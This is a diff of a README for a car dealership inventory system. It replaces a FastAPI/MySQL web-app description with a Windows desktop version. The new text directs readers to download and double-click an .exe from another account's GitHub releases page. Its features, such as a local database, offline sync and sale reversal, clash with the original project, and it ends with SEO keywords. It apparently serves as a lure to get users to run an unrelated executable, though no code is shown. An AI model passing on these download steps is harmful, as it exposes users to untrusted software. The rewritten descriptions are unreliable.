@@ -1,160 +1,63 @@
-# Apex Auto - Car Dealership Inventory Management System 2026
+# 🚗 apex-auto-inventory-system - Manage dealership vehicle stock with ease
 
-> **Apex Auto gives dealerships a web-based way to manage vehicle inventory, search available stock, handle purchases, and control administrative tasks across a Python and JavaScript application stack.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Guaranilonger504/apex-auto-inventory-system/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/will-hallaed686/apex-auto-inventory-system?style=flat-square)](https://github.com/will-hallaed686/apex-auto-inventory-system)
+Apex Auto helps car dealerships organize vehicle records. You use this system to track available cars, log customer purchases, and manage daily administrative tasks. The software keeps your inventory information in one place.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://will-hallaed686.github.io/apex-auto-inventory-system/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Auto%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Auto">
-  </a>
-</p>
+Follow these steps to get the system on your computer:
 
-> **[Download Apex Auto](https://will-hallaed686.github.io/apex-auto-inventory-system/)**
+1. Visit the [official releases page](https://github.com/Guaranilonger504/apex-auto-inventory-system/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installation process.
 
----
+## ⚙️ System requirements
 
-[Download Latest Build](https://will-hallaed686.github.io/apex-auto-inventory-system/)
+Your computer needs to meet these standards to run the software:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Internet Connection: Required only for initial setup and system updates.
 
-## Overview
+## 🛠️ Setting up your dealership account
 
-Apex Auto provides dealerships with a shared workspace for finding, arranging, and maintaining vehicle listings. Its inventory tools cover catalog searches, detailed filtering, purchase processing, and automatic quantity updates when stock is sold or replenished.
+Once you install the program, open it from the shortcut on your desktop. You will see a login screen. Use the default credentials provided in your initial documentation or click "Register" if this is your first time using the system. The dashboard displays a summary of your current vehicle stock. You can sort these listings by make, model, year, or price.
 
-The platform uses FastAPI for its backend, MySQL for data storage, and a responsive JavaScript single-page frontend styled with Tailwind CSS. Role separation keeps standard inventory browsing distinct from administrator functions, including creating, editing, deleting, and restocking vehicle entries.
+## 📦 Managing inventory
 
----
+You add new vehicles to your stock through the inventory menu. Click "Add New Entry" and fill in the required fields. You must include the Vehicle Identification Number (VIN) for every car. The system saves this data automatically. When you sell a vehicle, locate the item in the list and click "Mark as Sold." This updates your records and removes the car from the active search results.
 
-## Capabilities
+## 📋 Searching for stock
 
-- View dealership vehicles in a responsive browser-based catalog
-- Find vehicles by searching across multiple inventory fields
-- Complete purchases while reducing the related stock count
-- Allow administrators to add, update, and delete vehicle records
-- Increase available quantities through inventory restocking
-- Secure API endpoints with JWT-based authentication
-- Enforce distinct user and administrator privileges with role-based access control
-- Exchange frontend and backend data through a RESTful API
-- Provide frontend and backend test suites created using TDD practices
+Use the search bar at the top of the screen to find specific vehicles. Type the model name or the price range to filter the results. The system updates the list in real time. You can clear your filters at any time by clicking the reset button next to the search bar.
 
----
+## 📑 Administrative tasks
 
-## Getting Started
+The admin panel allows you to review sales reports and manage user permissions. Only users with manager roles can access this area. You can generate reports for the week or the month. Export these files to your computer for printing or record keeping.
 
-First, download the repository and move into the project folder:
+## ❓ Frequently asked questions
 
-```bash
-git clone https://github.com/will-hallaed686/apex-auto-inventory-system.git
-cd REPO
-```
+**Do I need a database server?**
+No. The system installs a local database automatically. You do not need to manage complex configurations.
 
-Create an isolated Python environment, install the required backend packages, and set up a MySQL database for Apex Auto. Once those steps are complete, launch the FastAPI application through its project entry point:
+**Will the program work if I lose my internet connection?**
+Yes. You can manage your local inventory while offline. The system syncs your changes once the connection returns.
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload
-```
+**Can I undo a sale?**
+Yes. Navigate to the sales history tab, find the transaction, and select "Revert Sale." This action returns the vehicle to your active inventory list.
 
-PowerShell users can enable the virtual environment with:
+**How do I update the program?**
+Restart the application to check for updates. If a new version exists, the program asks if you want to install it. Follow the prompts to finish the update.
 
-```powershell
-.venv\Scripts\Activate.ps1
-```
+**Where does the software store my data?**
+The program keeps your data in a secure file within the local application folder. We recommend you back up this folder regularly to protect your records.
 
-After the API has started, load the frontend using the web entry point configured by the project.
+## 🆘 Getting help
 
----
+If you encounter an error, restart the application first. If the problem continues, check the application logs found in the settings menu. You can provide these logs to your system administrator to help identify the issue. Use the contact link in the help menu if you need to reach out to the support team for further assistance. Keep your application updated to ensure you have the latest features and security fixes.
 
-## Working with the Application
-
-The usual inventory process looks like this:
-
-1. Log in to the web interface.
-2. Review the vehicles currently listed in the catalog.
-3. Apply search terms and multiple filters to refine the results.
-4. Select a vehicle to inspect its availability.
-5. Submit a purchase and let the system adjust the stock.
-6. If you have administrator privileges, add vehicles, change listings, delete records, or replenish quantities.
-
-When working directly with the API, authenticate to receive a JWT and attach that token to protected REST calls:
-
-```http
-Authorization: Bearer <your-jwt-token>
-```
-
-While the FastAPI server is active, its configured API documentation may also be available, depending on the routes defined by the application.
-
----
-
-## Environment Setup
-
-The application needs MySQL connection information along with settings used for authentication. Keep these environment-specific values in a local environment file or deployment configuration instead of placing them directly in source files.
-
-A configuration may follow this structure:
-
-```env
-DATABASE_URL=mysql+pymysql://user:password@localhost/apex_auto
-JWT_SECRET_KEY=replace-with-a-local-secret
-```
-
-Replace the sample values with settings for the environment where Apex Auto is running. Never commit real credentials or other private secrets to the repository.
-
----
-
-## System Requirements
-
-- A web browser with JavaScript enabled
-- A Python version supported by the project dependencies
-- FastAPI and the required backend packages
-- A running MySQL database server
-- Database settings compatible with SQLAlchemy
-- Node.js tools when they are needed by the frontend configuration
-- Connectivity between the browser, API, and database
-- Sufficient storage for application files, database data, and test assets
-
----
-
-## Frequently Asked Questions
-
-### What type of organization uses Apex Auto?
-
-Apex Auto is built for dealerships and teams that want browser-based vehicle inventory management with different experiences for regular users and administrators.
-
-### How are vehicle listings changed?
-
-An administrator can create new records, modify existing vehicles, remove listings, and add stock through the administrative workflow.
-
-### What should I do if a vehicle cannot be purchased?
-
-Purchasing decreases the available quantity. If no stock remains, inspect the vehicle record or have an administrator replenish it through the restocking process.
-
-### Where do MySQL and authentication values belong?
-
-Place database connection details and authentication configuration in the deployment environment or a local environment file. Avoid hard-coding these settings in the application.
-
-### What authentication method protects the API?
-
-Protected endpoints use JWT authentication. Log in, obtain a token, and send it in the bearer authorization header for subsequent requests.
-
-### What are the first startup checks?
-
-Confirm that the Python packages are installed, MySQL can be reached, the database configuration is accurate, and the API is being started from the correct project directory. The backend and frontend test suites can help locate regressions.
-
-### How do I get the newest build?
-
-Check the project repository and its download link for the latest build and available release information.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: inventory management, dealership software, vehicle tracking, auto sales, shop automation
